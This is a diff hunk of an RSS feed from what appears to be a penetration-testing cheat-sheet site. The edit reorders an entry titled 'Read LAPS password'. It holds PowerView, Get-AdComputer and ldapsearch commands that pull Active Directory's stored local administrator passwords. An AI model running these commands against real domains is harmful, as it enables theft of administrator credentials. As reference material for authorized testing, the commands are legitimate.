@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/readlapspassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/readlapspassword/</guid>
-      <description> Abuse #1: Read LAPS password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred Abuse #1: Read LAPS Password (From Linux) ldapsearch -h 10.10.11.10 -b &amp;#39;DC=&amp;lt;,example&amp;gt;,DC=&amp;lt;com&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;lt;PASSWORD&amp;gt; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd </description>
+      <description> Abuse #1: Read LAPS Password Linux Windows ldapsearch -h 10.10.11.10 -b &amp;#39;DC=&amp;lt;,example&amp;gt;,DC=&amp;lt;com&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;lt;PASSWORD&amp;gt; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred </description>
     </item>
   </channel>
 </rss>
